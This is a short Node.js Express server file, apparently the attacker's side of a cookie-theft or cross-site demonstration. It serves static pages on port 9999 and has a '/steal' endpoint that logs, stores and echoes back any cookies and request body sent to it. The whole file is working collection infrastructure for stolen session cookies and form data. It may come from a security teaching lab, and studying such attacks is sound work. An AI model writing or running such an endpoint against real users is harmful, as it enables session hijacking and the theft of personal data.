import express from "express"
import cookieParser from "cookie-parser"

const PORT = 9999

let stolenCookie, stolenData

const server = express()

server.use(express.json())

server.use(cookieParser())

server.use(express.static("./public"))

server.post("/steal", (req, res) => {
  console.log(req.cookies, req.body)
  stolenCookie = req.cookies
  stolenData = req.body

  res.json([stolenCookie, stolenData])
})

server.listen(PORT, () => console.log(`Attacker is listening on port ${PORT}`))